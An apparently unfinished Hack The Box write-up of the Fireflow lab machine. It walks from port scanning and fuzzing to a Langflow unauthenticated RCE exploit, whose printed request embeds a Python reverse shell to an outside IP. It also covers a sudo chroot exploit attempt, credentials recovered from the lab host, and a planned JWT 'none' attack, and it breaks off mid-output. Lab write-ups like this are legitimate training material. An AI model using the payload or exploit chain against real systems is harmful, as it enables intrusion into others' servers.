---
publish: true
tags:
  - unfinished
---
Today we'll do the [Fireflow](https://app.hackthebox.com/machines/Fireflow) HTB's machine :)

First of all we need to add the register to `/etc/hosts`:

```
$ echo "10.129.244.214 fireflow.htb" | sudo tee -a /etc/hosts
10.129.244.214 fireflow.htb
$
```

And please, DO NOT FORGET to use `-a` if you don't want to fully rewrite your `/etc/hosts` file (already happened to me).

# Enumeration

## Port Scanning

You can use any port scanner, like [Rustscan](https://github.com/bee-san/RustScan) or [Nmap](https://nmap.org/), but I'll use [Naabu](https://github.com/projectdiscovery/naabu), by projectdiscovery (same creators of httpx, subfinder, nuclei and others).

First, let's run it and then use Nmap to run default scripts (`-A`, naabu are currently implementing services and versions detection, so if you're reading this, you should check the repository for more information)

```
[3,979s][~] ᛋᛋ naabu -host 10.129.244.214 -p -                

                  __
  ___  ___  ___ _/ /  __ __
 / _ \/ _ \/ _ \/ _ \/ // /
/_//_/\_,_/\_,_/_.__/\_,_/

		projectdiscovery.io

[INF] Current naabu version 2.6.1 (latest)
[WRN] UI Dashboard is disabled, Use -dashboard option to enable
[INF] Running CONNECT scan with non root privileges
10.129.244.214:22
10.129.244.214:443
[INF] Found 2 ports on host 10.129.244.214 (10.129.244.214)
```

Alright, now we can use the nmap default scripts to get banners and others

```
[2m14,942s][~] ᛋᛋ sudo nmap -A 10.129.244.214 -p22,443,65535 -T5
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-18 16:40 -0300
Nmap scan report for fireflow.htb (110.129.244.214)
Host is up (0.17s latency).

PORT      STATE  SERVICE  VERSION
22/tcp    open   ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
443/tcp   open   ssl/http nginx
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=fireflow.htb/organizationName=Task Force Nightfall/countryName=US
| Subject Alternative Name: DNS:fireflow.htb, DNS:*.fireflow.htb
| Not valid before: 2026-04-14T16:35:31
|_Not valid after:  2028-07-17T16:35:31
|_http-title: FireFlow \xE2\x80\x94 Task Force Nightfall
65535/tcp closed unknown
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 65535/tcp)
HOP RTT       ADDRESS
1   222.76 ms 10.10.14.1
2   222.83 ms fireflow.htb (10.129.244.214)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.57 seconds
```

> [!tip] Nmap OS Detection trick
> If you already know open ports, add a random port to `-p` argument, so nmap can detect the OS more accurately :)

So we already know that the running service is called _"Task Force Nightfall"_ (for htb machines, it's probably a fictional website, but you shall check it anyways, if isn't). Let's enumerate subdomains!

## Subdomain fuzzing

In my daily recon process, I use [FFuF](https://github.com/ffuf/ffuf) to web enumeration, so let's keep it as it is :p

To do an accurate subdomain enumeration, we need to know how to do this, without touching DNS, because the HTB app is under `/etc/hosts`. To do this, we'll use a technique that uses the `Host` header to enumerate possible subdomains by using a response-size filter.

```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u "http://machine.htb" -H "Host: FUZZ.machine.htb" -fs <default_res_size>
```

To discover the default response size, we can send requests to the host using a obviously non-existent subdomain (like `deadbeef.machine.htb`, etc). To do this, you can send tons of requests with pseudo-random domains, but for tests-only, you can use this:

```
for i in {1..25}; do
    curl -s -o /dev/null -w '%{http_code} %{size_download}\n' \
      -H "Host: random-$i.machine.htb" \
      http://machine.htb
done
```

Let's apply this technique in Fireflow 🔥

```
for i in {1..25}; do
    curl -s -k -o /dev/null -w '%{http_code} %{size_download}\n' \
      -H "Host: random-$i.fireflow.htb" \
      https://fireflow.htb
done
```

With the addition of `-k` to arguments, we could successfully get the default response size:

```
[2,953s][130][~/Hacking/CTFs/Fireflow] ᛋᛋ for i in {1..25}; do
    curl -s -k -o /dev/null -w '%{http_code} %{size_download}\n' \
      -H "Host: random-$i.fireflow.htb" \
      https://fireflow.htb
done
301 162
301 162
301 162
301 162
```

> [!tip] Why I need to use the `-k` flag?
> The host has a invalid ssl certificate, so if you don't use it, curl will throw this error: `curl: (60) SSL certificate OpenSSL verify result: self-signed certificate (18)` and `curl failed to verify the legitimacy of the server and therefore could not establish a secure connection to it`.

![[Fireflow - ffuf subdomain.png]]
```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u "https://fireflow.htb" -H "Host: FUZZ.fireflow.htb" -fs 162 -c  

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : https://fireflow.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.fireflow.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 162
________________________________________________

flow                    [Status: 200, Size: 1142, Words: 132, Lines: 25, Duration: 217ms]
```

So we find the flow subdomain, let's add it to our `/etc/hosts`

```
[14ms][~/Hacking/CTFs/Fireflow] ᛋᛋ echo "10.129.244.214 flow.fireflow.htb" | sudo tee -a /etc/hosts
10.129.244.214 flow.fireflow.htb
[1,463s][~/Hacking/CTFs/Fireflow] ᛋᛋ 
```

## More Port Scanning

We discovered a valid subdomain, so we can suppose that some services may respond differently.

```
[1,463s][~/Hacking/CTFs/Fireflow] ᛋᛋ naabu -host flow.fireflow.htb -p -

                  __
  ___  ___  ___ _/ /  __ __
 / _ \/ _ \/ _ \/ _ \/ // /
/_//_/\_,_/\_,_/_.__/\_,_/

		projectdiscovery.io

[INF] Current naabu version 2.6.1 (latest)
[WRN] UI Dashboard is disabled, Use -dashboard option to enable
[INF] Running CONNECT scan with non root privileges
flow.fireflow.htb:22
flow.fireflow.htb:443
[INF] Found 2 ports on host flow.fireflow.htb (10.129.244.214)
[2m15,336s][~/Hacking/CTFs/Fireflow] ᛋᛋ
```

Same ports open, let's check if something changed in nmap default scripts

```
[2m15,336s][~/Hacking/CTFs/Fireflow] ᛋᛋ sudo nmap -A flow.fireflow.htb -p22,443,65535 -T5
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-19 16:34 -0300
Nmap scan report for flow.fireflow.htb (10.129.244.214)
Host is up (0.15s latency).
rDNS record for 10.129.244.214: fireflow.htb

PORT      STATE  SERVICE   VERSION
22/tcp    open   ssh       OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
443/tcp   open   ssl/https nginx
| ssl-cert: Subject: commonName=fireflow.htb/organizationName=Task Force Nightfall/countryName=US
| Subject Alternative Name: DNS:fireflow.htb, DNS:*.fireflow.htb
| Not valid before: 2026-04-14T16:35:31
|_Not valid after:  2028-07-17T16:35:31
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_http-title: Langflow
|_http-server-header: nginx
|_ssl-date: TLS randomness does not represent time
65535/tcp closed unknown
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 65535/tcp)
HOP RTT       ADDRESS
1   147.17 ms 10.10.14.1
2   147.47 ms fireflow.htb (10.129.244.214)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.31 seconds
[20,840s][~/Hacking/CTFs/Fireflow] ᛋᛋ 
```

I noticed that the title changed from `FireFlow \xE2\x80\x94 Task Force Nightfall` to `Langflow` (which is a well-known Low-code AI builder for agentic and RAG applications, as their website is saying).

## Directories Fuzzing

After subdomain enumeration, we could start directories fuzzing, I'll keep using FFuF with my default parameters:

```
ffuf -u <http/s>://machine.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -recursion -fc 404,500 -o dirs/machine.htb/out -of all -e .html,.php,.aspx,.js,.css,.htm,.jsp -t 500
```

> [!tip] How to make FFuF blazing fast?
> You can use the `-t` flag to increase the threads amount!
> Start with `-t 200` and then scale up to `-t 800`, which can handle almost every wordlist.
> Don't forget, any real-world website will block your requests (rate limiting).

So I ran it against the fireflow, and then against it's subdomain:

```
[2,569s][~/Hacking/CTFs/Fireflow] ᛋᛋ ffuf -u https://fireflow.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -recursion -fc 404,500 -o dirs/fireflow.htb/out -of all -e .html,.php,.aspx,.js,.css,.htm,.jsp -t 500

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : https://fireflow.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Extensions       : .html .php .aspx .js .css .htm .jsp 
 :: Output file      : dirs/fireflow.htb/out.{json,ejson,html,md,csv,ecsv}
 :: File format      : all
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 500
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404,500
________________________________________________

index.html              [Status: 200, Size: 12913, Words: 2516, Lines: 299, Duration: 147ms]
:: Progress: [239992/239992] :: Job [1/1] :: 639 req/sec :: Duration: [0:02:00] :: Errors: 8 ::
```

We just found `index.html`, which I already expected, as the website is just a landing page, so we could discover the langflow subdomain. Let's run it again, but against the `flow.fireflow.htb` domain:

In my first attempt, everything (literally everything, even `GET /skibid.aspx`) was returning http 200, so I added some filters:

```
ffuf -u https://flow.fireflow.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -recursion -fc 404,500 -o dirs/flow.fireflow.htb/out -of all -e .html,.php,.aspx,.js,.css,.htm,.jsp -t 500 -fs 0,1142 -fw 1,132
```

And now I could normally keep fuzzing. Unfortunately I just found a `/logs` and `/docs`, and they're both useless:

```
[8m46,642s][~/Hacking/CTFs/Fireflow] ᛋᛋ curl -k https://flow.fireflow.htb/logs
{"detail":"No authentication credentials provided"}
[0,727s][~/Hacking/CTFs/Fireflow] ᛋᛋ 
```

## LangFlow CVE

After a fast search, I discovered the `/api/v1/version` endpoint, which is useful to search for already known vulnerabilities in the version, using exploitdb (or just googling it).

```
[0,710s][~/Hacking/CTFs/Fireflow] ᛋᛋ curl -ks https://flow.fireflow.htb/api/v1/version | jq
{
  "version": "1.8.2",
  "main_version": "1.8.2",
  "package": "Langflow"
}
[0,684s][~/Hacking/CTFs/Fireflow] ᛋᛋ 
```

After another quick search, I found the CVE [2026-33017](https://nvd.nist.gov/vuln/detail/CVE-2026-33017), which is a unauthenticated RCE in LangFlow `/api/v1/build_public_tmp/{flow_id}/flow` endpoints, which allows building public flows by any unauthenticated user.

I could exploit this manually, but I found a public PoC on github: https://github.com/EQSTLab/CVE-2026-33017, so let's exploit it!

# Initial Access

## Understanding CVE 2026-33017 - Unauthenticated RCE in LangFlow

The logic error is that anyone can create a custom component, whose python code is executed on the server, through a `build_public_tmp` request. This code can get a shell access. Here is a PoC request:

```http
POST /api/v1/build_public_tmp/00000000-0000-0000-0000-000000000001/flow?event_delivery=direct&log_builds=false HTTP/1.1
Host: localhost:7860
Content-Type: application/json
Cookie: client_id=12345678-1234-1234-1234-123456789012
Connection: close

{
  "data": {
    "nodes": [
      {
        "id": "Exploit",
        "data": {
          "id": "Exploit",
          "type": "ExploitComp",
          "node": {
            "template": {
              "_type": "Component",
              "code": {
                "type": "code",
                "value": "from lfx.custom.custom_component.component import Component\nfrom lfx.io import Output\nfrom lfx.schema.data import Data\n\nclass ExploitComp(Component):\n    display_name = 'X'\n    outputs = [Output(display_name='O', name='o', method='r')]\n\n    def r(self) -> Data:\n        import socket,subprocess\n        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n        s.connect(('192.168.102.178', 4444))\n        p = subprocess.Popen(['/bin/bash', '-i'], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())\n        p.wait()\n        return Data(data={'ok': 1})"
              }
            },
            "outputs": [
              { "types": ["Data"], "name": "o", "method": "r" }
            ]
          }
        }
      }
    ],
    "edges": []
  }
}
```

As we can see, it runs a bash instance and redirects it to our listener.

To actively exploit this CVE, you just need a vulnerable target, and a public flow id.

## Exploiting LangFlow (or trying)

First of all we need a public flow id, so I firstly tried to logging into the website, unfortunately, I got a infinite loading screen:

![[Fireflow - langflow loading.png|640]]

## Bypassing Infinite Loading

I tried dropping the cache or removing any session cookies, but nothing worked, so I opened my devtools console and tried sniffing into the requests, I found that the website is trying to "refresh" the session, using a Refresh Token (commonly a JWT).

![[Fireflow - Network Devtools.png]]

We haven't a valid session or a valid refresh token, as we can see in the response body:

```json
{"detail":"Invalid refresh token"}
```

After that I opened [Caido](https://www.caido.io/) and searched for any response of the `/refresh` endpoint, and I found this:

```http
HTTP/1.1 401 Unauthorized
Server: nginx
Date: Wed, 19 Aug 2026 22:43:10 GMT
Content-Type: application/json
Content-Length: 34
Connection: keep-alive
www-authenticate: Bearer
access-control-allow-credentials: true
access-control-allow-origin: https://flow.fireflow.htb
vary: Origin
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Content-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: ws: wss:;

{
    "detail": "Invalid refresh token"
}
```

Sometimes the response is code 401, sometimes 403, so I thought _"Yo, I'll just change it with Match & Replace duuh"_ and I did it. I created this two rules:

![[Fireflow - MnR rule 403.png]]

![[Fireflow - MnR rule 401.png]]

And (thanks God) it worked!

![[Fireflow - LangFlow login page.png]]

## Shell Access Exploiting

After obtaining access to the sign up menu, I create an account using the credentials: `1337:1337` BUT I get an error that says: "Waiting for approval". Everything indicates that an admin needs to approve my brand new account.

![[Fireflow - Waiting For Approval.png]]

The only thing that we need is a valid flow id, so I tried searching among the landing page at fireflow.htb. I found a button that redirects to a playground (that is inactive):

![[Fireflow - Playground button.png]]

This just redirected us to https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25, which obviously contains a valid uuid in the URL. I tried accessing https://flow.fireflow.htb/flows/7d84d636-af65-42e4-ac38-26e867052c25 but it just redirected me to the index (because I'm not authenticated).

Time to run the exploit, I ran it just with the `--help` flag just to get the parameters:

```
[249ms][2][main][~/Hacking/CTFs/Fireflow/CVE-2026-33017] ᛋᛋ python exploit.py --help
usage: exploit.py [-h] --url URL --flow-id FLOW_ID --lhost LHOST --lport LPORT [--listen] [--timeout TIMEOUT]

CVE-2026-33017 unauth build_public_tmp code-execution PoC

options:
  -h, --help         show this help message and exit
  --url URL          Target Langflow server URL
  --flow-id FLOW_ID  UUID of the shared public flow
  --lhost LHOST      Reverse shell callback IP
  --lport LPORT      Reverse shell callback port
  --listen           Run the built-in listener
  --timeout TIMEOUT
[150ms][main][~/Hacking/CTFs/Fireflow/CVE-2026-33017] ᛋᛋ 
```

Wasn't that hard to build the command with the parameters that I already know, I just started my shell handler, [penelope](https://github.com/brightio/penelope), and then ran the exploit:

```
[142ms][2][main][~/Hacking/CTFs/Fireflow/CVE-2026-33017] ᛋᛋ python exploit.py --lhost 10.10.15.160 --lport 4444 --url https://flow.fireflow.htb --flow-id 7d84d636-af65-42e4-ac38-26e867052c25
[*] Target: https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow?event_delivery=direct&log_builds=false
[*] Callback: 10.10.15.160:4444
[*] Request returned no response (expected if shell connected): HTTPSConnectionPool(host='flow.fireflow.htb', port=443): Max retries exceeded with url: /api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow?event_delivery=direct&log_builds=false (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self-signed certificate (_ssl.c:1082)')))
[530ms][main][~/Hacking/CTFs/Fireflow/CVE-2026-33017] ᛋᛋ
```

This error happens because the website haven't a valid certificate, I just fixed it in the exploit.py:

```python
# Around line 107
def send_payload():
    print(f"[*] Target: {endpoint}")
    print(f"[*] Callback: {args.lhost}:{args.lport}")
    try:
        resp = requests.post(
            endpoint,
            json=build_payload(args.lhost, args.lport),
            cookies={"client_id": "poc"},
            timeout=args.timeout,
            verify=False # Just disabled SSL Verifying
        )
        print(f"[*] HTTP {resp.status_code}")
    except requests.RequestException as e:
        print(f"[*] Request returned no response (expected if shell connected): {e}")
```

And then ran it again:

```
[1m12,995s][main][~/Hacking/CTFs/Fireflow/CVE-2026-33017] ᛋᛋ python exploit.py --lhost 10.10.15.160 --lport 4444 --url https://flow.fireflow.htb --flow-id 7d84d636-af65-42e4-ac38-26e867052c25
[*] Target: https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow?event_delivery=direct&log_builds=false
[*] Callback: 10.10.15.160:4444
[14,243s][130][main][~/Hacking/CTFs/Fireflow/CVE-2026-33017] ᛋᛋ 
```

![[Fireflow - Penelope Shell as www-data.png]]

# User Privilege Escalation

## langflow.db

After that, I checked this langflow.db, what I want here is a sqlite3 database, so I could easily dump it's data. To check it, I just needed to run:

```
file langflow.db
```

And then get my output:

```sh
www-data@fireflow:/var/lib/langflow$ file langflow.db
langflow.db: empty
```

This says that the langflow.db file is empty, but I'll check it with sqlite3 anyways:

```sh
www-data@fireflow:/var/lib/langflow$ which sqlite3
/usr/bin/sqlite3
www-data@fireflow:/var/lib/langflow$ sqlite3 langflow.db 
SQLite version 3.45.1 2024-01-30 16:01:20
Enter ".help" for usage hints.
sqlite> .tables
sqlite> .databases
main: /var/lib/langflow/langflow.db r/o
sqlite> 
```

## Enumerating

So yes, it's actually empty, I'll keep enumerating the system, firstly I ran `getcap`, so if python or any other binary has `cap_setuid` it'll be an easy rooting:

```sh
www-data@fireflow:/var/lib/langflow$ which getcap
/usr/sbin/getcap
www-data@fireflow:/var/lib/langflow$ getcap -r /
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/lib/snapd/snap-confine cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_setgid,cap_setuid,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin,cap_sys_resource=p
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin,cap_sys_nice=ep
www-data@fireflow:/var/lib/langflow$ 
```

Nothing here, let's keep enumerating. Now I targeted `sudo` (well-known for CVEs like [CVE 2025-32463](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot)):

```sh
www-data@fireflow:/var/lib/langflow$ sudo -V
Sudo version 1.9.15p5
Sudoers policy plugin version 1.9.15p5
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.15p5
Sudoers audit plugin version 1.9.15p5
www-data@fireflow:/var/lib/langflow$ sudo -l
[sudo] password for www-data: 
sudo: a password is required
www-data@fireflow:/var/lib/langflow$ 
```

## CVE 2025-32463

The `sudo` is under a vulnerable version: `1.9.15p5` (as chwoot targets 1.9.14 up to 1.9.17, including every _p_ revision). I downloaded the public exploit to my `/tmp` directory and then uploaded it using penelope:

![[Fireflow - Uploaded sudo-chwoot.png]]

And then I tried running the exploit:

```sh
www-data@fireflow:/tmp$ chmod +x sudo-chwoot.sh 
www-data@fireflow:/tmp$ ls -lAh
total 60K
drwxr-xr-x 1 root     root     4.0K Aug 20 01:17 ctd-volume338964395
drwxrwxrwt 2 root     root     4.0K Aug 20 01:15 .font-unix
drwxrwxrwt 2 root     root     4.0K Aug 20 01:15 .ICE-unix
drwx------ 2 root     root     4.0K Aug 20 01:15 snap-private-tmp
-rwxr-xr-x 1 www-data www-data 1.1K Aug 20 02:00 sudo-chwoot.sh
drwx------ 3 root     root     4.0K Aug 20 01:37 systemd-private-aae608ce521d4d2092c9cb4d44e609f7-fwupd.service-dPhxij
drwx------ 3 root     root     4.0K Aug 20 01:15 systemd-private-aae608ce521d4d2092c9cb4d44e609f7-ModemManager.service-Piw5ZD
drwx------ 3 root     root     4.0K Aug 20 01:15 systemd-private-aae608ce521d4d2092c9cb4d44e609f7-polkit.service-WFC0f9
drwx------ 3 root     root     4.0K Aug 20 01:15 systemd-private-aae608ce521d4d2092c9cb4d44e609f7-systemd-logind.service-tAVqS7
drwx------ 3 root     root     4.0K Aug 20 01:15 systemd-private-aae608ce521d4d2092c9cb4d44e609f7-systemd-resolved.service-pLBMsO
drwx------ 3 root     root     4.0K Aug 20 01:15 systemd-private-aae608ce521d4d2092c9cb4d44e609f7-systemd-timesyncd.service-z4x3zw
drwx------ 3 root     root     4.0K Aug 20 01:37 systemd-private-aae608ce521d4d2092c9cb4d44e609f7-upower.service-aH0xhs
drwx------ 2 root     root     4.0K Aug 20 01:16 vmware-root_679-3988687326
drwxrwxrwt 2 root     root     4.0K Aug 20 01:15 .X11-unix
drwxrwxrwt 2 root     root     4.0K Aug 20 01:15 .XIM-unix
www-data@fireflow:/tmp$ ./sudo-chwoot.sh 
woot!
[sudo] password for www-data: 
Sorry, try again.
[sudo] password for www-data: 
Sorry, try again.
[sudo] password for www-data: 
sudo: 3 incorrect password attempts
www-data@fireflow:/tmp$ 
```

Unfortunately, the machine `www-data` user has a password (which isn't expected), so this won't work.

## More enumeration

Now I attempted to find the "common" stuff: SUID Binaries. I just needed to run `find` command with some parameters:

```sh
www-data@fireflow:/tmp$ find / -type f -perm -4000 2>/dev/null 
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/chfn
/usr/bin/fusermount3
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/mount
/usr/bin/su
/usr/bin/chsh
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
www-data@fireflow:/tmp$ 
```

Nothing again, I'll check now for `.env` files, using `find` again:

```sh
www-data@fireflow:/tmp$ find / -type f -name .env 2>/dev/null
/etc/langflow/.env
www-data@fireflow:/tmp$ cat /etc/langflow/.env
LANGFLOW_AUTO_LOGIN=False
LANGFLOW_SUPERUSER=langflow
LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
LANGFLOW_SECRET_KEY=XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE
LANGFLOW_CONFIG_DIR=/var/lib/langflow
LANGFLOW_LOG_LEVEL=warning
LANGFLOW_NEW_USER_IS_ACTIVE=False
LANGFLOW_CORS_ORIGINS=https://flow.fireflow.htb,https://fireflow.htb
www-data@fireflow:/tmp$ 
```

## Password Reuse: Shell as nightfall

We got it, I need to check for users in `/home` and with shell in `/etc/passwd`, to abuse a possible CWE 260 for ssh (which is Password in Configuration File).

```
www-data@fireflow:/tmp$ ls /home
nightfall
www-data@fireflow:/tmp$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
nightfall:x:1000:1000::/home/nightfall:/bin/bash
www-data@fireflow:/tmp$ 
```

So we already know the `nighfall` user, let's try the password `n1ghtm4r3_b4_n1ghtf4ll` for logging in:

```sh
www-data@fireflow:/tmp$ su nightfall
Password: 
nightfall@fireflow:/tmp$ id
uid=1000(nightfall) gid=1000(nightfall) groups=1000(nightfall)
nightfall@fireflow:/tmp$ 
```

It works! Now I'll just try using it with ssh (the port 22 was open too):

![[Fireflow - Connecting as nightfall through ssh.png]]

And it works too! Now let's keep escalating our privileges to root!

# Local Privilege Escalation to Root

First of all I'll search for any configuration file in my home directory and for any creds in the environment:

```sh
nightfall@fireflow:~$ ls -lAh
total 28K
lrwxrwxrwx 1 root      root         9 May 12 14:24 .bash_history -> /dev/null
-rw-r--r-- 1 nightfall nightfall  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 nightfall nightfall 3.7K Mar 31  2024 .bashrc
drwx------ 2 nightfall nightfall 4.0K May 12 15:28 .cache
drwxrwxr-x 3 nightfall nightfall 4.0K May 12 15:28 .local
drwx------ 2 nightfall nightfall 4.0K Aug 20 01:15 .mcp
-rw-r--r-- 1 nightfall nightfall  807 Mar 31  2024 .profile
-rw-r----- 1 root      nightfall   33 Aug 20 01:16 user.txt
nightfall@fireflow:~$ ls .mcp/
config.json
nightfall@fireflow:~$ cat .mcp/config.json 
{
  "server": "http://10.129.89.142:30080",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}
nightfall@fireflow:~$ env
SHELL=/usr/bin/bash
HISTCONTROL=ignoreboth
PWD=/home/nightfall
LOGNAME=nightfall
XDG_SESSION_TYPE=tty
HOME=/home/nightfall
LANG=en_US.UTF-8
HISTFILE=/dev/null
LS_COLORS=<this env is a bit large, but haven't nothing interesting>
SSH_CONNECTION=10.10.15.160 39650 10.129.89.39 22
LESSCLOSE=/usr/bin/lesspipe %s %s
XDG_SESSION_CLASS=user
TERM=xterm-256color
LESSOPEN=| /usr/bin/lesspipe %s
USER=nightfall
SHLVL=3
XDG_SESSION_ID=13
XDG_RUNTIME_DIR=/run/user/1000
SSH_CLIENT=10.10.15.160 39650 22
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
_=/usr/bin/env
nightfall@fireflow:~$ 
```

## Enumerating the MCP AI Tool Registry

I just got a login and password to another web app, let's reach it with curl:

```sh
nightfall@fireflow:~$ curl -s http://10.129.89.142:30080/api/v1/version | jq
{
  "service": "MCP AI Tool Registry",
  "version": "0.1.0",
  "auth": {
    "type": "JWT",
    "header": "Authorization: Bearer <token>",
    "supported_algorithms": [
      "HS256",
      "none"
    ]
  },
  "docs": "/docs",
  "endpoints": [
    "POST /mcp                        [MCP JSON-RPC 2.0]",
    "POST /api/v1/auth",
    "GET  /api/v1/tools",
    "POST /api/v1/tools               [admin]"
  ]
}
nightfall@fireflow:~$ 
```

One interesting thing, we can use `none` as our algorithm, this is a attack vector to escalate our privileges, just editing our JWT and signing it with _none algorithm_.

First of all I need to login in the service, but I don't know the api schema for the authentication endpoint `POST /api/v1/auth`, luckly the endpoint also give us a documentation route, so let's get into it with another curl:

```
nightfall@fireflow:~$ curl http://10.129.89.142:30080/docs

    <!DOCTYPE html>
    <html>
    <head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swagger-ui-dist@5/swagger-ui.css">
    <link rel="shortcut icon" href="https://fastapi.tiangolo.com/img/favicon.png">
    <title>MCP AI Tool Registry — Task Force Nightfall - Swagger UI</title>
    </head>
    <body>
    <div id="swagger-ui">
    </div>
    <script src="https://cdn.jsdelivr.net/npm/swagger-ui-dist@5/swagger-ui-bundle.js"></script>
    <!-- `SwaggerUIBundle` is now available on the page -->
    <script>
    const ui = SwaggerUIBundle({
        url: '/openapi.json',
    "dom_id": "#swagger-ui",
"layout": "BaseLayout",
"deepLinking": true,
"showExtensions": true,
"showCommonExtensions": true,
oauth2RedirectUrl: window.location.origin + '/docs/oauth2-redirect',
    presets: [
        SwaggerUIBundle.presets.apis,
        SwaggerUIBundle.SwaggerUIStandalonePreset
        ],
    })
    </script>
    </body>
    </html>
    nightfall@fireflow:~$ 
```

## Local Port Forwarding through ssh

The [Swagger](https://swagger.io/) UI probably needs to run in a browser, but this host (`10.129.89.142`) isn't accessible by me. 

```
[11ms][~/Hacking/CTFs/Fireflow] ᛋᛋ ping 10.129.89.142 -c4
PING 10.129.89.142 (10.129.89.142) 56(84) bytes de dados.
64 bytes de 10.129.89.142: icmp_seq=1 ttl=63 tempo=148 ms
64 bytes de 10.129.89.142: icmp_seq=2 ttl=63 tempo=149 ms
